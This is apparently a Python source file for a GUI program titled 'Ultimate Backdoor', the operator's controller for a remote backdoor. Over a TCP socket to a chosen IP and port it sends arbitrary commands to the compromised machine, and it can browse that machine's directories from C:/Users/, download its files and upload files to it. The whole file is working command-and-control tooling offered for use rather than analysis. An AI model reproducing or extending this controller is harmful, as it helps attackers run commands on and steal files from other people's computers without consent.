import customtkinter as ctk
import tkinter as tk
from tkinter import messagebox
from tkinter import filedialog
import socket
from os.path import exists, basename
from os import listdir
from pathlib import Path
from PIL import Image

# Make sure the configuration file exists; if not, create it
if not exists("IpPortAddr.txt"):
    with open("IpPortAddr.txt", "x") as f:
        f.write("localhost\n8080")


# Create the main application
class InterfaceApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Ultimate Backdoor")
        self.geometry("1100x580")  # Set the dimensions of the window

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.Bytes = 4096
        self.file_buttons = []

        # Create Side Bar
        self.side_bar = ctk.CTkFrame(self)
        self.side_bar.pack(fill="y", side="left", anchor="w", padx=10, pady=10)

        ubd_image = ctk.CTkImage(
            light_image=Image.open("Images/Title.png"),
            dark_image=Image.open("Images/Title.png"),
            size=(960 / 5, 540 / 5),
        )

        self.ubd_image = ctk.CTkLabel(self.side_bar, image=ubd_image, text="")
        self.ubd_image.pack(padx=10, pady=10)

        # Create IP Address and Port Number entries
        self.ip_text = ctk.CTkLabel(self.side_bar, text="IP Address:")
        self.ip_text.pack(side="top")

        self.ip_entry = ctk.CTkEntry(self.side_bar, placeholder_text="IP Address")
        self.ip_entry.pack(side="top")

        self.port_text = ctk.CTkLabel(self.side_bar, text="Port:")
        self.port_text.pack(side="top")

        self.port_entry = ctk.CTkEntry(self.side_bar, placeholder_text="Port #")
        self.port_entry.pack(side="top")

        # Spacer
        self.spacer_1 = ctk.CTkLabel(self.side_bar, text="")
        self.spacer_1.pack(pady=1, padx=1)

        # Create Tab Side Buttons
        self.console_button = ctk.CTkButton(
            self.side_bar, text="Console", command=lambda: self.OpenTab("Console")
        )
        self.console_button.pack(fill="x", padx=35, pady=10)

        self.file_explorer_button = ctk.CTkButton(
            self.side_bar,
            text="File Explorer",
            command=lambda: self.OpenTab("File Explorer"),
        )
        self.file_explorer_button.pack(fill="x", padx=35, pady=10)

        self.tasks_button = ctk.CTkButton(
            self.side_bar,
            text="Tasks",
            command=lambda: self.OpenTab("Tasks"),
        )
        self.tasks_button.pack(fill="x", padx=35, pady=10)

        # Bottom Sidebar Buttons
        self.exit_button = ctk.CTkButton(
            self.side_bar, text="Exit", command=self.OnClosed
        )
        self.exit_button.pack(fill="x", side="bottom", padx=35, pady=20)

        self.appearance_mode_optionemenu = ctk.CTkOptionMenu(
            self.side_bar,
            values=["Dark", "Light", "System"],
            command=self.change_appearance_mode_event,
        )
        self.appearance_mode_optionemenu.pack(fill="x", side="bottom", padx=35, pady=0)
        self.appearance_mode_label = ctk.CTkLabel(self.side_bar, text="Appearance Mode")
        self.appearance_mode_label.pack(fill="x", side="bottom", padx=35, pady=0)

        # Create tabs
        self.tab_control = ctk.CTkTabview(self, height=570)
        self.tab_control.pack(fill="both")

        # Create Console Tab
        self.console_tab = self.tab_control.add("Console")
        self.console_text = ctk.CTkTextbox(self.console_tab, wrap="word", height=15)
        self.console_text.pack(expand=True, fill="both")
        self.console_text.configure(state="disabled")

        self.cmd_entry = ctk.CTkEntry(self.console_tab, placeholder_text="Send")
        self.cmd_entry.pack(side="left", expand=True, fill="x")
        self.cmd_entry.bind(
            "<Return>", lambda: self.send_command(self.cmd_entry.get())
        )  # Bind Enter key press

        self.send_button = ctk.CTkButton(
            self.console_tab,
            text="Send!",
            command=self.cmd_send_command,
        )
        self.send_button.pack(side="left")

        # Create File Explorer Tab
        self.file_explorer_tab = self.tab_control.add("File Explorer")

        self.update_button = ctk.CTkButton(
            self.file_explorer_tab, text="Update Tab", command=self.UpdateFileExplorer
        )
        self.update_button.pack(side="top", padx=10, pady=1)

        self.directory_entry = ctk.CTkEntry(
            self.file_explorer_tab, placeholder_text="..\\"
        )
        self.directory_entry.pack(fill="x", padx=10, pady=10)
        self.directory_entry.bind(
            "<Return>",
            lambda: self.UpdateFileExplorer(),
        )  # Bind Enter key press

        self.file_explorer_side_bar = ctk.CTkFrame(self.file_explorer_tab)
        self.file_explorer_side_bar.pack(
            fill="y", side="left", anchor="w", padx=10, pady=10
        )

        for i in ["C:/", "C:/Users/", "C:/Users/{USER}/"]:
            self.add_save_file_button(i)

        self.button_frame = ctk.CTkScrollableFrame(self.file_explorer_tab)
        self.button_frame.pack(fill="both", expand=True, padx=10, pady=10)

        # Create Tasks Tab
        self.tasks_tab = self.tab_control.add("Tasks")
        self.tasks_frame = ctk.CTkScrollableFrame(self.tasks_tab, height=510)
        self.tasks_frame.pack(fill="both")

        # Tasks Buttons & Commands

        # Timeout
        self.timeout_label = ctk.CTkLabel(
            self.tasks_frame,
            text="Timeout Time: (The max amount of time to wait for a response)",
        )
        self.timeout_label.pack(fill="both")

        self.timeout_entry = ctk.CTkEntry(self.tasks_frame, placeholder_text="3...")
        self.timeout_entry.pack(fill="x")
        self.timeout_entry.bind(
            "<Return>", lambda: self.SetTimeout()
        )  # Bind Enter key press

        # File Upload
        self.upload_button = ctk.CTkButton(
            self.tasks_frame, text="Upload File", command=self.Upload
        )
        self.upload_button.pack(padx=10, pady=10)

        """# Connection
        self.safe_mode_bool = tk.BooleanVar()
        self.safe_mode = ctk.CTkCheckBox(self.tasks_frame, text="Safe Mode", variable=self.safe_mode_bool)
        self.safe_mode.pack(padx=10, pady=10)

        self.connection_interval_label = ctk.CTkLabel(
            self.tasks_frame, text="Connection Interval"
        )
        self.connection_interval_label.pack(padx=10, pady=0)

        self.connection_interval = ctk.CTkEntry(
            self.tasks_frame, placeholder_text="5.."
        )
        self.connection_interval.pack(padx=10, pady=0)
        self.connection_interval.bind(
            "<Return>", lambda: self.SetConnectionInterval()
        )  # Bind Enter key press"""

        # Saving And Loading IP and Ports
        savedIPPort = open("IpPortAddr.txt", "r").read().splitlines()
        self.ip_entry.delete(0, len(self.ip_entry.get()))
        self.ip_entry.insert(0, savedIPPort[0])
        self.port_entry.delete(0, len(self.ip_entry.get()))
        self.port_entry.insert(0, savedIPPort[1])

        # Saving Everything And ARE YOU SURE Request
        self.protocol("WM_DELETE_WINDOW", self.OnClosed)

        socket.setdefaulttimeout(3)
        try:
            self.UpdateFileExplorer()
        except:
            pass

    def change_appearance_mode_event(self, new_appearance_mode: str):
        ctk.set_appearance_mode(new_appearance_mode)

    def OpenTab(self, Name):
        self.tab_control.set(Name)

    def SetTimeout(self):
        text = self.timeout_entry.get()
        for i in "qwertyuiopasdfghjklzxcvbnm,./;'[]\\|+=_-)(*&^%$#@!~<>?:{)}" + '"':
            text.replace(i, "")
        self.send_command("set timeout " + text)

    """def SetConnectionInterval(self):
        text = self.connection_interval.get()
        for i in "qwertyuiopasdfghjklzxcvbnm,./;'[]\\|+=_-)(*&^%$#@!~<>?:{)}" + '"':
            text.replace(i, "")
        self.send_command("set interval " + text)"""

    def OnClosed(self):
        with open("IpPortAddr.txt", "w") as f:
            f.write(self.ip_entry.get() + "\n" + self.port_entry.get())

        if messagebox.askokcancel("Quit", "Do you want to quit?"):
            self.destroy()

    def cmd_send_command(self):
        self.send_command(self.cmd_entry.get())

    def send_command(self, command: str):
        clearing = False
        connection = None
        try:
            self.console_text.configure(state="normal")

            if command == "":
                response = "NULL"
            elif command == "cls" or command == "clear":
                response = ""
                clearing = True
            else:
                connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                connection.connect((self.ip_entry.get(), int(self.port_entry.get())))
                connection.send(command.encode())

                if "upload" in command:
                    Name = command.replace("upload", "").split(" ")[1]
                    if exists(Name):
                        Contents = open(Name, "r").read()
                    else:
                        Contents = command.replace("upload", "").split(" ", 2)[2]
                    command = "upload " + Name + " " + Contents
                elif "set bytes" in command:
                    self.Bytes = int(command.replace("set bytes ", ""))
                elif "set timeout" in command:
                    socket.setdefaulttimeout(float(command.replace("set timeout ", "")))

                response = connection.recv(self.Bytes).decode()
        except Exception as e:
            response = str(e)

        if not clearing:
            if "file: " in response:
                response = response.replace("file: ", "").split(" : ", 1)
                with open(response[0], "w") as file:
                    file.write(response[1])
                response = response[0] + " Has been downloaded."
            elif command == "selfdir":
                response = "\n".join(listdir())

            self.console_text.insert("0.0", f"> {command}\n{response}\n")
        else:
            self.console_text.delete("0.0", "end")
        self.cmd_entry.delete(0, len(command))
        self.console_text.configure(state="disabled")
        if connection:
            connection.close()

    def RawCommand(self, command):
        if command != "":
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((self.ip_entry.get(), int(self.port_entry.get())))
            connection.send(command.encode())
            response = connection.recv(self.Bytes).decode()
            connection.close()
        else:
            response = "NULL"
        return response

    def Upload(self):
        filePath = filedialog.askopenfilename()

        if not filePath:
            return

        # Extract the filename from the path
        name = basename(filePath)

        contents = open(filePath).read()

        self.SendUpload(name, contents)

    def SendUpload(self, Name, Contents):
        self.RawCommand("upload " + Name + " " + Contents)

    def UpdateFileExplorer(self):
        dirEntryText = self.directory_entry.get()
        isFile = Path(dirEntryText).suffix

        if isFile:
            file = self.RawCommand("download " + dirEntryText)
            with open(dirEntryText, "w") as f:
                f.write(file.replace("file: ", "", 1).split(" : ", 1)[1])
        else:
            DIR = self.RawCommand("cd " + dirEntryText)
            if "DIR:" in DIR:
                self.directory_entry.delete(0, len(self.directory_entry.get()))
                self.directory_entry.insert(0, DIR.replace("DIR: ", ""))
            directoryList = self.RawCommand("dir").splitlines()
            self.button_frame.pack(fill="both", expand=True, padx=10, pady=10)

            for i in range(0, len(self.file_buttons)):
                self.file_buttons[0].destroy()
                self.file_buttons.pop(0)

            for i in directoryList:
                self.add_file_button(i)
            self.add_file_button("..\\")

        self.button_frame._parent_canvas.yview_moveto(0.0)

    def FileButtonPress(self, Name):
        self.directory_entry.delete(0, len(self.directory_entry.get()))
        self.directory_entry.insert(0, Name)
        self.UpdateFileExplorer()

    def add_file_button(self, Name):
        new_button = ctk.CTkButton(
            self.button_frame,
            text=Name,
            width=100,
            command=lambda: self.FileButtonPress(Name),
        )
        new_button.pack(padx=5, pady=5, fill="x")
        self.file_buttons.append(new_button)

    def add_save_file_button(self, Name):
        new_button = ctk.CTkButton(
            self.file_explorer_side_bar,
            text=Name,
            width=100,
            command=lambda: self.FileButtonPress(Name),
        )
        new_button.pack(padx=5, pady=5, fill="x")
        # self.file_buttons.append(new_button)


if __name__ == "__main__":
    app = InterfaceApp()
    app.mainloop()
